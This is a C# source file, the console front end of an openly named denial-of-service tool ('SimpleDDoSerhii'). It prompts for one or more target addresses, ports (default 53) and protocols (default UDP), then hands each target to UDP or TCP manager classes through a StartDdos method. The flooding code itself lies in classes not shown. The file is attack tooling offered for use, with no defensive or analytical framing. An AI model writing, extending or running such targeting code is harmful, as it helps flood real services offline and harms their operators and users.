using System;
using System.Collections.Generic;
using SimpleDDoSerhii.Entites;
using SimpleDDoSerhii.Clients;

namespace SimpleDDoSerhii
{
    public  class ConsoleInterface
    {
        private List<NetworkCredentional> networkCredentionals = new List<NetworkCredentional>();
        public ConsoleInterface()
        {
            Console.WriteLine("Hello comrade!");
            InitConsoleInterface();
        }
        public void InitConsoleInterface()
        {
            Console.WriteLine("Enter endpoint address:");
            var endPointAddress = Console.ReadLine();
            Console.WriteLine("Enter destination port:");
            dynamic destinationPort = Console.ReadLine();
            destinationPort = String.IsNullOrEmpty(destinationPort) ? 53 : int.Parse(destinationPort);
            Console.WriteLine("Enter protocol:");
            var protocol = Console.ReadLine();
            protocol = String.IsNullOrEmpty(protocol) ? "UDP" : protocol;
            this.networkCredentionals.Add(new NetworkCredentional { DestinationPort = destinationPort, EndPointAddress = endPointAddress, Protocol = protocol });
            Console.WriteLine("Do u wanna add more target? (1 - yes, 0 - no)");
            var answer = Console.ReadLine();
            if(int.Parse(answer) == 1)
            {
                InitConsoleInterface();
            } else
            {
                AnalyzeNetworkCredentioal();
            }

        }
        private void AnalyzeNetworkCredentioal()
        {
            foreach(var nc in networkCredentionals)
            {
                switch (nc.Protocol.ToUpper())
                {
                    case "UDP":
                        StartDdos(new UdpManager(), nc);
                        break;
                    case "TCP":
                        StartDdos(new TcpManager(), nc);
                        break;
                    default:
                        StartDdos(new TcpManager(), nc);
                        break;
                }
            }
        }
        public void StartDdos(CreatorClientManager creator,NetworkCredentional networkCredentional)
        {
            creator.PoslatRusskiyKorabl(networkCredentional);
        }
        public List<NetworkCredentional> GetUserNetworkCredentional()
        {
            return networkCredentionals;
        }
    }
}

